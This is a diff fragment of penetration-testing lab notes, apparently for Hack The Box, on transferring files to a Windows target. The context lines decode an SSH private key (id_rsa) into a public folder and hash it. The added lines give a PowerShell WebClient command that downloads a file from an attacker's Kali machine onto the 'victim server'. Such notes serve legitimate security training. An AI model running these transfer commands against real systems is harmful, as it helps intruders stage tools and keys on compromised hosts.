@@ -6,4 +6,7 @@ Step 3) PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]:
 Step 4) Get-FileHash C:\Users\Public\id_rsa -Algorithm md5 :- Confirming the file is transfered 
 
 
+Option 2) Powershell 
 
+This is the example to download the file in to the Windows victim server 
+        (New-Object Net.WebClient).DownloadFile('http://<kali machine:port>/<Target File URL>','<Output File Name>')
